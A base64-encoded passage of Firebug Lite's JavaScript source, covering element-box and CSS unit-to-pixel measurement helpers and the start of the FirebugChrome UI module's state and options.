ZmZzZXRUb3A7DQogICAgICAgIH0NCiAgICAgICAgd2hpbGUgKGVsID0gZWwub2Zmc2V0UGFyZW50KTsNCiAgICAgICAgICAgIA0KICAgICAgICByZXR1cm4ge2xlZnQ6bGVmdCwgdG9wOnRvcH07ICAgICAgDQogICAgfSwNCiAgICANCiAgICBnZXRFbGVtZW50Qm94OiBmdW5jdGlvbihlbCkNCiAgICB7DQogICAgICAgIHZhciByZXN1bHQgPSB7fTsNCiAgICAgICAgDQogICAgICAgIGlmIChlbC5nZXRCb3VuZGluZ0NsaWVudFJlY3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciByZWN0ID0gZWwuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIGZpeCBJRSBwcm9ibGVtIHdpdGggb2Zmc2V0IHdoZW4gbm90IGluIGZ1bGxzY3JlZW4gbW9kZQ0KICAgICAgICAgICAgdmFyIG9mZnNldCA9IGlzSUUgPyB0aGlzLmRvY3VtZW50LmJvZHkuY2xpZW50VG9wIHx8IHRoaXMuZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmNsaWVudFRvcDogMDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIHNjcm9sbCA9IHRoaXMuZ2V0V2luZG93U2Nyb2xsUG9zaXRpb24oKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgcmVzdWx0LnRvcCA9IE1hdGgucm91bmQocmVjdC50b3AgLSBvZmZzZXQgKyBzY3JvbGwudG9wKTsNCiAgICAgICAgICAgIHJlc3VsdC5sZWZ0ID0gTWF0aC5yb3VuZChyZWN0LmxlZnQgLSBvZmZzZXQgKyBzY3JvbGwubGVmdCk7DQogICAgICAgICAgICByZXN1bHQuaGVpZ2h0ID0gTWF0aC5yb3VuZChyZWN0LmJvdHRvbSAtIHJlY3QudG9wKTsNCiAgICAgICAgICAgIHJlc3VsdC53aWR0aCA9IE1hdGgucm91bmQocmVjdC5yaWdodCAtIHJlY3QubGVmdCk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZSANCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHBvc2l0aW9uID0gdGhpcy5nZXRFbGVtZW50UG9zaXRpb24oZWwpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICByZXN1bHQudG9wID0gcG9zaXRpb24udG9wOw0KICAgICAgICAgICAgcmVzdWx0LmxlZnQgPSBwb3NpdGlvbi5sZWZ0Ow0KICAgICAgICAgICAgcmVzdWx0LmhlaWdodCA9IGVsLm9mZnNldEhlaWdodDsNCiAgICAgICAgICAgIHJlc3VsdC53aWR0aCA9IGVsLm9mZnNldFdpZHRoOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICByZXR1cm4gcmVzdWx0Ow0KICAgIH0sDQogICAgDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gTWVhc3VyZW1lbnQgTWV0aG9kcw0KICAgIA0KICAgIGdldE1lYXN1cmVtZW50OiBmdW5jdGlvbihlbCwgbmFtZSkNCiAgICB7DQogICAgICAgIHZhciByZXN1bHQgPSB7dmFsdWU6IDAsIHVuaXQ6ICJweCJ9Ow0KICAgICAgICANCiAgICAgICAgdmFyIGNzc1ZhbHVlID0gdGhpcy5nZXRTdHlsZShlbCwgbmFtZSk7DQogICAgICAgIA0KICAgICAgICBpZiAoIWNzc1ZhbHVlKSByZXR1cm4gcmVzdWx0Ow0KICAgICAgICBpZiAoY3NzVmFsdWUudG9Mb3dlckNhc2UoKSA9PSAiYXV0byIpIHJldHVybiByZXN1bHQ7DQogICAgICAgIA0KICAgICAgICB2YXIgcmVNZWFzdXJlID0gLyhcZCtcLj9cZCopKC4qKS87DQogICAgICAgIHZhciBtID0gY3NzVmFsdWUubWF0Y2gocmVNZWFzdXJlKTsNCiAgICAgICAgDQogICAgICAgIGlmIChtKQ0KICAgICAgICB7DQogICAgICAgICAgICByZXN1bHQudmFsdWUgPSBtWzFdLTA7DQogICAgICAgICAgICByZXN1bHQudW5pdCA9IG1bMl0udG9Mb3dlckNhc2UoKTsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHJlc3VsdDsgICAgICAgIA0KICAgIH0sDQogICAgDQogICAgZ2V0TWVhc3VyZW1lbnRJblBpeGVsczogZnVuY3Rpb24oZWwsIG5hbWUpDQogICAgew0KICAgICAgICBpZiAoIWVsKSByZXR1cm4gbnVsbDsNCiAgICAgICAgDQogICAgICAgIHZhciBtID0gdGhpcy5nZXRNZWFzdXJlbWVudChlbCwgbmFtZSk7DQogICAgICAgIHZhciB2YWx1ZSA9IG0udmFsdWU7DQogICAgICAgIHZhciB1bml0ID0gbS51bml0Ow0KICAgICAgICANCiAgICAgICAgaWYgKHVuaXQgPT0gInB4IikNCiAgICAgICAgICAgIHJldHVybiB2YWx1ZTsNCiAgICAgICAgICANCiAgICAgICAgZWxzZSBpZiAodW5pdCA9PSAicHQiKQ0KICAgICAgICAgICAgcmV0dXJuIHRoaXMucG9pbnRzVG9QaXhlbHMobmFtZSwgdmFsdWUpOw0KICAgICAgICAgIA0KICAgICAgICBlbHNlIGlmICh1bml0ID09ICJlbSIpDQogICAgICAgICAgICByZXR1cm4gdGhpcy5lbVRvUGl4ZWxzKGVsLCB2YWx1ZSk7DQogICAgICAgICAgDQogICAgICAgIGVsc2UgaWYgKHVuaXQgPT0gIiUiKQ0KICAgICAgICAgICAgcmV0dXJuIHRoaXMucGVyY2VudFRvUGl4ZWxzKGVsLCB2YWx1ZSk7DQogICAgICAgIA0KICAgICAgICBlbHNlIGlmICh1bml0ID09ICJleCIpDQogICAgICAgICAgICByZXR1cm4gdGhpcy5leFRvUGl4ZWxzKGVsLCB2YWx1ZSk7DQogICAgICAgIA0KICAgICAgICAvLyBUT0RPOiBhZGQgb3RoZXIgdW5pdHMuIE1heWJlIGNyZWF0ZSBhIGJldHRlciBnZW5lcmFsIHdheQ0KICAgICAgICAvLyB0byBjYWxjdWxhdGUgbWVhc3VyZW1lbnRzIGluIGRpZmZlcmVudCB1bml0cy4gICAgDQogICAgfSwNCg0KICAgIGdldE1lYXN1cmVtZW50Qm94MTogZnVuY3Rpb24oZWwsIG5hbWUpDQogICAgew0KICAgICAgICB2YXIgc3VmaXhlcyA9IFsiVG9wIiwgIkxlZnQiLCAiQm90dG9tIiwgIlJpZ2h0Il07DQogICAgICAgIHZhciByZXN1bHQgPSBbXTsNCiAgICAgICAgDQogICAgICAgIGZvcih2YXIgaT0wLCBzdWZpeDsgc3VmaXg9c3VmaXhlc1tpXTsgaSsrKQ0KICAgICAgICAgICAgcmVzdWx0W2ldID0gTWF0aC5yb3VuZCh0aGlzLmdldE1lYXN1cmVtZW50SW5QaXhlbHMoZWwsIG5hbWUgKyBzdWZpeCkpOw0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHt0b3A6cmVzdWx0WzBdLCBsZWZ0OnJlc3VsdFsxXSwgYm90dG9tOnJlc3VsdFsyXSwgcmlnaHQ6cmVzdWx0WzNdfTsNCiAgICB9LA0KICAgIA0KICAgIGdldE1lYXN1cmVtZW50Qm94OiBmdW5jdGlvbihlbCwgbmFtZSkNCiAgICB7DQogICAgICAgIHZhciByZXN1bHQgPSBbXTsNCiAgICAgICAgdmFyIHN1Zml4ZXMgPSBuYW1lID09ICJib3JkZXIiID8NCiAgICAgICAgICAgICAgICBbIlRvcFdpZHRoIiwgIkxlZnRXaWR0aCIsICJCb3R0b21XaWR0aCIsICJSaWdodFdpZHRoIl0gOg0KICAgICAgICAgICAgICAgIFsiVG9wIiwgIkxlZnQiLCAiQm90dG9tIiwgIlJpZ2h0Il07DQogICAgICAgIA0KICAgICAgICBpZiAoaXNJRSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHByb3BOYW1lLCBjc3NWYWx1ZTsNCiAgICAgICAgICAgIHZhciBhdXRvTWFyZ2luID0gbnVsbDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZm9yKHZhciBpPTAsIHN1Zml4OyBzdWZpeD1zdWZpeGVzW2ldOyBpKyspDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcHJvcE5hbWUgPSBuYW1lICsgc3VmaXg7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgY3NzVmFsdWUgPSBlbC5jdXJyZW50U3R5bGVbcHJvcE5hbWVdIHx8IGVsLnN0eWxlW3Byb3BOYW1lXTsgDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKGNzc1ZhbHVlID09ICJhdXRvIikNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmICghYXV0b01hcmdpbikNCiAgICAgICAgICAgICAgICAgICAgICAgIGF1dG9NYXJnaW4gPSB0aGlzLmdldENTU0F1dG9NYXJnaW5Cb3goZWwpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgcmVzdWx0W2ldID0gYXV0b01hcmdpbltzdWZpeC50b0xvd2VyQ2FzZSgpXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICByZXN1bHRbaV0gPSB0aGlzLmdldE1lYXN1cmVtZW50SW5QaXhlbHMoZWwsIHByb3BOYW1lKTsNCiAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIH0NCiAgICAgICAgZWxzZQ0KICAgICAgICB7DQogICAgICAgICAgICBmb3IodmFyIGk9MCwgc3VmaXg7IHN1Zml4PXN1Zml4ZXNbaV07IGkrKykNCiAgICAgICAgICAgICAgICByZXN1bHRbaV0gPSB0aGlzLmdldE1lYXN1cmVtZW50SW5QaXhlbHMoZWwsIG5hbWUgKyBzdWZpeCk7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHJldHVybiB7dG9wOnJlc3VsdFswXSwgbGVmdDpyZXN1bHRbMV0sIGJvdHRvbTpyZXN1bHRbMl0sIHJpZ2h0OnJlc3VsdFszXX07DQogICAgfSwgDQogICAgDQogICAgZ2V0Q1NTQXV0b01hcmdpbkJveDogZnVuY3Rpb24oZWwpDQogICAgew0KICAgICAgICBpZiAoaXNJRSAmJiAiIG1ldGEgdGl0bGUgaW5wdXQgc2NyaXB0IGxpbmsgYSAiLmluZGV4T2YoIiAiK2VsLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkrIiAiKSAhPSAtMSkNCiAgICAgICAgICAgIHJldHVybiB7dG9wOjAsIGxlZnQ6MCwgYm90dG9tOjAsIHJpZ2h0OjB9Ow0KICAgICAgICAgICAgLyoqLw0KICAgICAgICAgICAgDQogICAgICAgIGlmIChpc0lFICYmICIgaDEgaDIgaDMgaDQgaDUgaDYgaDcgdWwgcCAiLmluZGV4T2YoIiAiK2VsLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkrIiAiKSA9PSAtMSkNCiAgICAgICAgICAgIHJldHVybiB7dG9wOjAsIGxlZnQ6MCwgYm90dG9tOjAsIHJpZ2h0OjB9Ow0KICAgICAgICAgICAgLyoqLw0KICAgICAgICAgICAgDQogICAgICAgIHZhciBvZmZzZXRUb3AgPSAwOw0KICAgICAgICBpZiAoZmFsc2UgJiYgaXNJRVN0YW50YW5kTW9kZSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHNjcm9sbFNpemUgPSBGaXJlYnVnLmJyb3dzZXIuZ2V0V2luZG93U2Nyb2xsU2l6ZSgpOw0KICAgICAgICAgICAgb2Zmc2V0VG9wID0gc2Nyb2xsU2l6ZS5oZWlnaHQ7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHZhciBib3ggPSB0aGlzLmRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOw0KICAgICAgICAvL2JveC5zdHlsZS5jc3NUZXh0ID0gIm1hcmdpbjowOyBwYWRkaW5nOjFweDsgYm9yZGVyOiAwOyBwb3NpdGlvbjpzdGF0aWM7IG92ZXJmbG93OmhpZGRlbjsgdmlzaWJpbGl0eTogaGlkZGVuOyI7DQogICAgICAgIGJveC5zdHlsZS5jc3NUZXh0ID0gIm1hcmdpbjowOyBwYWRkaW5nOjFweDsgYm9yZGVyOiAwOyB2aXNpYmlsaXR5OiBoaWRkZW47IjsNCiAgICAgICAgDQogICAgICAgIHZhciBjbG9uZSA9IGVsLmNsb25lTm9kZShmYWxzZSk7DQogICAgICAgIHZhciB0ZXh0ID0gdGhpcy5kb2N1bWVudC5jcmVhdGVUZXh0Tm9kZSgiJm5ic3A7Iik7DQogICAgICAgIGNsb25lLmFwcGVuZENoaWxkKHRleHQpOw0KICAgICAgICANCiAgICAgICAgYm94LmFwcGVuZENoaWxkKGNsb25lKTsNCiAgICANCiAgICAgICAgdGhpcy5kb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGJveCk7DQogICAgICAgIA0KICAgICAgICB2YXIgbWFyZ2luVG9wID0gY2xvbmUub2Zmc2V0VG9wIC0gYm94Lm9mZnNldFRvcCAtIDE7DQogICAgICAgIHZhciBtYXJnaW5Cb3R0b20gPSBib3gub2Zmc2V0SGVpZ2h0IC0gY2xvbmUub2Zmc2V0SGVpZ2h0IC0gMiAtIG1hcmdpblRvcDsNCiAgICAgICAgDQogICAgICAgIHZhciBtYXJnaW5MZWZ0ID0gY2xvbmUub2Zmc2V0TGVmdCAtIGJveC5vZmZzZXRMZWZ0IC0gMTsNCiAgICAgICAgdmFyIG1hcmdpblJpZ2h0ID0gYm94Lm9mZnNldFdpZHRoIC0gY2xvbmUub2Zmc2V0V2lkdGggLSAyIC0gbWFyZ2luTGVmdDsNCiAgICAgICAgDQogICAgICAgIHRoaXMuZG9jdW1lbnQuYm9keS5yZW1vdmVDaGlsZChib3gpOw0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHt0b3A6bWFyZ2luVG9wK29mZnNldFRvcCwgbGVmdDptYXJnaW5MZWZ0LCBib3R0b206bWFyZ2luQm90dG9tLW9mZnNldFRvcCwgcmlnaHQ6bWFyZ2luUmlnaHR9Ow0KICAgIH0sDQogICAgDQogICAgZ2V0Rm9udFNpemVJblBpeGVsczogZnVuY3Rpb24oZWwpDQogICAgew0KICAgICAgICB2YXIgc2l6ZSA9IHRoaXMuZ2V0TWVhc3VyZW1lbnQoZWwsICJmb250U2l6ZSIpOw0KICAgICAgICANCiAgICAgICAgaWYgKHNpemUudW5pdCA9PSAicHgiKSByZXR1cm4gc2l6ZS52YWx1ZTsNCiAgICAgICAgDQogICAgICAgIC8vIGdldCBmb250IHNpemUsIHRoZSBkaXJ0eSB3YXkNCiAgICAgICAgdmFyIGNvbXB1dGVEaXJ0eUZvbnRTaXplID0gZnVuY3Rpb24oZWwsIGNhbGlicmF0aW9uKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgZGl2ID0gdGhpcy5kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsNCiAgICAgICAgICAgIHZhciBkaXZTdHlsZSA9IG9mZnNjcmVlblN0eWxlOw0KDQogICAgICAgICAgICBpZiAoY2FsaWJyYXRpb24pDQogICAgICAgICAgICAgICAgZGl2U3R5bGUgKz0gICIgZm9udC1zaXplOiIrY2FsaWJyYXRpb24rInB4OyI7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGRpdi5zdHlsZS5jc3NUZXh0ID0gZGl2U3R5bGU7DQogICAgICAgICAgICBkaXYuaW5uZXJIVE1MID0gIkEiOw0KICAgICAgICAgICAgZWwuYXBwZW5kQ2hpbGQoZGl2KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIHZhbHVlID0gZGl2Lm9mZnNldEhlaWdodDsNCiAgICAgICAgICAgIGVsLnJlbW92ZUNoaWxkKGRpdik7DQogICAgICAgICAgICByZXR1cm4gdmFsdWU7DQogICAgICAgIH07DQogICAgICAgIA0KICAgICAgICAvKg0KICAgICAgICB2YXIgY2FsaWJyYXRpb25CYXNlID0gMjAwOw0KICAgICAgICB2YXIgY2FsaWJyYXRpb25WYWx1ZSA9IGNvbXB1dGVEaXJ0eUZvbnRTaXplKGVsLCBjYWxpYnJhdGlvbkJhc2UpOw0KICAgICAgICB2YXIgcmF0ZSA9IGNhbGlicmF0aW9uQmFzZSAvIGNhbGlicmF0aW9uVmFsdWU7DQogICAgICAgIC8qKi8NCiAgICAgICAgDQogICAgICAgIC8vIHRoZSAiZGlydHkgdGVjaG5pcXVlIiBmYWlscyBpbiBzb21lIGVudmlyb25tZW50cywgc28gd2UncmUgdXNpbmcgYSBzdGF0aWMgdmFsdWUNCiAgICAgICAgLy8gYmFzZWQgaW4gc29tZSB0ZXN0cy4NCiAgICAgICAgdmFyIHJhdGUgPSAyMDAgLyAyMjU7DQogICAgICAgIA0KICAgICAgICB2YXIgdmFsdWUgPSBjb21wdXRlRGlydHlGb250U2l6ZShlbCk7DQoNCiAgICAgICAgcmV0dXJuIHZhbHVlICogcmF0ZTsNCiAgICB9LA0KICAgIA0KICAgIA0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAvLyBVbml0IEZ1bnRpb25zDQogIA0KICAgIHBvaW50c1RvUGl4ZWxzOiBmdW5jdGlvbihuYW1lLCB2YWx1ZSwgcmV0dXJuRmxvYXQpDQogICAgew0KICAgICAgICB2YXIgYXhpcyA9IC9Ub3AkfEJvdHRvbSQvLnRlc3QobmFtZSkgPyAieSIgOiAieCI7DQogICAgICAgIA0KICAgICAgICB2YXIgcmVzdWx0ID0gdmFsdWUgKiBwaXhlbHNQZXJJbmNoW2F4aXNdIC8gNzI7DQogICAgICAgIA0KICAgICAgICByZXR1cm4gcmV0dXJuRmxvYXQgPyByZXN1bHQgOiBNYXRoLnJvdW5kKHJlc3VsdCk7DQogICAgfSwNCiAgICANCiAgICBlbVRvUGl4ZWxzOiBmdW5jdGlvbihlbCwgdmFsdWUpDQogICAgew0KICAgICAgICBpZiAoIWVsKSByZXR1cm4gbnVsbDsNCiAgICAgICAgDQogICAgICAgIHZhciBmb250U2l6ZSA9IHRoaXMuZ2V0Rm9udFNpemVJblBpeGVscyhlbCk7DQogICAgICAgIA0KICAgICAgICByZXR1cm4gTWF0aC5yb3VuZCh2YWx1ZSAqIGZvbnRTaXplKTsNCiAgICB9LA0KICAgIA0KICAgIGV4VG9QaXhlbHM6IGZ1bmN0aW9uKGVsLCB2YWx1ZSkNCiAgICB7DQogICAgICAgIGlmICghZWwpIHJldHVybiBudWxsOw0KICAgICAgICANCiAgICAgICAgLy8gZ2V0IGV4IHZhbHVlLCB0aGUgZGlydHkgd2F5DQogICAgICAgIHZhciBkaXYgPSB0aGlzLmRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOw0KICAgICAgICBkaXYuc3R5bGUuY3NzVGV4dCA9IG9mZnNjcmVlblN0eWxlICsgIndpZHRoOiIrdmFsdWUgKyAiZXg7IjsNCiAgICAgICAgDQogICAgICAgIGVsLmFwcGVuZENoaWxkKGRpdik7DQogICAgICAgIHZhciB2YWx1ZSA9IGRpdi5vZmZzZXRXaWR0aDsNCiAgICAgICAgZWwucmVtb3ZlQ2hpbGQoZGl2KTsNCiAgICAgICAgDQogICAgICAgIHJldHVybiB2YWx1ZTsNCiAgICB9LA0KICAgICAgDQogICAgcGVyY2VudFRvUGl4ZWxzOiBmdW5jdGlvbihlbCwgdmFsdWUpDQogICAgew0KICAgICAgICBpZiAoIWVsKSByZXR1cm4gbnVsbDsNCiAgICAgICAgDQogICAgICAgIC8vIGdldCAlIHZhbHVlLCB0aGUgZGlydHkgd2F5DQogICAgICAgIHZhciBkaXYgPSB0aGlzLmRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOw0KICAgICAgICBkaXYuc3R5bGUuY3NzVGV4dCA9IG9mZnNjcmVlblN0eWxlICsgIndpZHRoOiIrdmFsdWUgKyAiJTsiOw0KICAgICAgICANCiAgICAgICAgZWwuYXBwZW5kQ2hpbGQoZGl2KTsNCiAgICAgICAgdmFyIHZhbHVlID0gZGl2Lm9mZnNldFdpZHRoOw0KICAgICAgICBlbC5yZW1vdmVDaGlsZChkaXYpOw0KICAgICAgICANCiAgICAgICAgcmV0dXJuIHZhbHVlOw0KICAgIH0sDQogICAgDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIGdldFN0eWxlOiBpc0lFID8gZnVuY3Rpb24oZWwsIG5hbWUpDQogICAgew0KICAgICAgICByZXR1cm4gZWwuY3VycmVudFN0eWxlW25hbWVdIHx8IGVsLnN0eWxlW25hbWVdIHx8IHVuZGVmaW5lZDsNCiAgICB9DQogICAgOiBmdW5jdGlvbihlbCwgbmFtZSkNCiAgICB7DQogICAgICAgIHJldHVybiB0aGlzLmRvY3VtZW50LmRlZmF1bHRWaWV3LmdldENvbXB1dGVkU3R5bGUoZWwsbnVsbClbbmFtZV0gDQogICAgICAgICAgICB8fCBlbC5zdHlsZVtuYW1lXSB8fCB1bmRlZmluZWQ7DQogICAgfQ0KDQp9Ow0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KfX0pOw0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5ucyggLyoqQHNjb3BlIG5zLWNocm9tZSovIGZ1bmN0aW9uKCkgeyB3aXRoIChGQkwpIHsNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIEdsb2JhbHMNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCi8vIFdpbmRvdyBPcHRpb25zDQoNCnZhciBXaW5kb3dEZWZhdWx0T3B0aW9ucyA9IA0KICAgIHsNCiAgICAgICAgdHlwZTogImZyYW1lIiwNCiAgICAgICAgaWQ6ICJGaXJlYnVnVUkiDQogICAgICAgIC8vaGVpZ2h0OiAzNTAgLy8gb2Jzb2xldGUNCiAgICB9LA0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KLy8gSW5zdGFudGlhdGVkIG9iamVjdHMNCg0KICAgIGNvbW1hbmRMaW5lLA0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KLy8gSW50ZXJmYWNlIEVsZW1lbnRzIENhY2hlDQoNCiAgICBmYlRvcCwNCiAgICBmYkNvbnRlbnQsDQogICAgZmJDb250ZW50U3R5bGUsDQogICAgZmJCb3R0b20sDQogICAgZmJCdG5JbnNwZWN0LA0KDQogICAgZmJUb29sYmFyLA0KDQogICAgZmJQYW5lbEJveDEsDQogICAgZmJQYW5lbEJveDFTdHlsZSwNCiAgICBmYlBhbmVsQm94MiwNCiAgICBmYlBhbmVsQm94MlN0eWxlLA0KICAgIGZiUGFuZWxCYXIyQm94LA0KICAgIGZiUGFuZWxCYXIyQm94U3R5bGUsDQoNCiAgICBmYkhTcGxpdHRlciwNCiAgICBmYlZTcGxpdHRlciwNCiAgICBmYlZTcGxpdHRlclN0eWxlLA0KDQogICAgZmJQYW5lbDEsDQogICAgZmJQYW5lbDFTdHlsZSwNCiAgICBmYlBhbmVsMiwNCiAgICBmYlBhbmVsMlN0eWxlLA0KDQogICAgZmJDb25zb2xlLA0KICAgIGZiQ29uc29sZVN0eWxlLA0KICAgIGZiSFRNTCwNCg0KICAgIGZiQ29tbWFuZExpbmUsDQogICAgZmJMYXJnZUNvbW1hbmRMaW5lLCANCiAgICBmYkxhcmdlQ29tbWFuZEJ1dHRvbnMsDQoNCi8vKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCi8vIENhY2hlZCBzaXplIHZhbHVlcw0KDQogICAgdG9wSGVpZ2h0LA0KICAgIHRvcFBhcnRpYWxIZWlnaHQsDQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjaHJvbWVSZWRyYXdTa2lwUmF0ZSA9IGlzSUUgPyA3NSA6IGlzT3BlcmEgPyA4MCA6IDc1LA0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgbGFzdFNlbGVjdGVkUGFuZWxOYW1lLA0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIA0KICAgIGZvY3VzQ29tbWFuZExpbmVTdGF0ZSA9IDAsIA0KICAgIGxhc3RGb2N1c2VkUGFuZWxOYW1lLCANCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGxhc3RIU3BsaXR0ZXJNb3VzZU1vdmUgPSAwLA0KICAgIG9uSFNwbGl0dGVyTW91c2VNb3ZlQnVmZmVyID0gbnVsbCwNCiAgICBvbkhTcGxpdHRlck1vdXNlTW92ZVRpbWVyID0gbnVsbCwNCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGxhc3RWU3BsaXR0ZXJNb3VzZU1vdmUgPSAwOw0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gRmlyZWJ1Z0Nocm9tZQ0KDQpGQkwuZGVmYXVsdFBlcnNpc3RlZFN0YXRlID0gDQp7DQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgIGlzT3BlbjogZmFsc2UsDQogICAgaGVpZ2h0OiAzMDAsDQogICAgc2lkZVBhbmVsV2lkdGg6IDM1MCwNCiAgICANCiAgICBzZWxlY3RlZFBhbmVsTmFtZTogIkNvbnNvbGUiLA0KICAgIHNlbGVjdGVkSFRNTEVsZW1lbnRJZDogbnVsbCwNCiAgICANCiAgICBodG1sU2VsZWN0aW9uU3RhY2s6IFtdDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KfTsNCg0KLyoqQG5hbWVzcGFjZSovDQpGQkwuRmlyZWJ1Z0Nocm9tZSA9IA0Kew0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICANCiAgICAvL2lzT3BlbjogZmFsc2UsDQogICAgLy9oZWlnaHQ6IDMwMCwNCiAgICAvL3NpZGVQYW5lbFdpZHRoOiAzNTAsDQogICAgDQogICAgLy9zZWxlY3RlZFBhbmVsTmFtZTogIkNvbnNvbGUiLA0KICAgIC8vc2VsZWN0ZWRIVE1MRWxlbWVudElkOiBudWxsLA0KICAgIA0KICAgIGNocm9tZU1hcDoge30sDQogICAgDQogICAgaHRtbFNlbGVjdGlvblN0YWNrOiBbXSwNCiAgICANCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgDQogICAgY3JlYXRlOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfSU5JVElBTElaRSkgRkJUcmFj